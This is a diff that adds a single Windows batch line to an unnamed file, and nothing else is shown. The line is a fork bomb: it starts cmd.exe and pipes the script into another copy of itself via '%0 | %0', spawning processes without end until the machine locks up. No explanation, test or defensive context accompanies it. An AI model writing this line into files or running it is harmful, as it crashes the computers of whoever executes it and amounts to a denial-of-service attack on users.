@@ -1,0 +1,1 @@
+start cmd.exe %0 | %0 taskkill /f /im cmd.exe
